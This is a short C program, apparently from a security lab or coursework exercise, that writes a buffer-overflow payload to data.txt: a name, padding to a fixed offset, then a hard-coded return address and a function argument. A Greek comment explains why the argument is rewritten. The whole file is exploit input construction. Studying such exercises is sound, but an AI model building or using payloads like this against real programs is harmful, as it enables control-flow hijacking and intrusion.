#include <stdio.h>
#include <errno.h>
#include <stdlib.h> 
#include <string.h>

int main(void){
	FILE *fp;
    int i;
    
	fp = fopen("data.txt","w+");
   
   if(fp == NULL){
   		fprintf(stderr , "Error Opening The File .\n");
		exit(1);	
    	}
    
    fputc('G',fp);
    fputc('r',fp);
    fputc('e',fp);
    fputc('g',fp);
    
    for(i = 4 ; i <= 47 ; i++)
        fputc(' ',fp);

    fputc('8',fp);

    fputc(0x68,fp);
    fputc(0x8b,fp);
    fputc(0x04,fp);
    fputc(0x8,fp);
 
 /*Epeidi exei to buf[i] = 0 prepei na grapsw ksana to argument s*/ 

    fputc(0xe0,fp);
    fputc(0x65,fp);
    fputc(0x0d,fp);
    fputc(0x8,fp);

    fclose(fp);
	return 0;
}
	


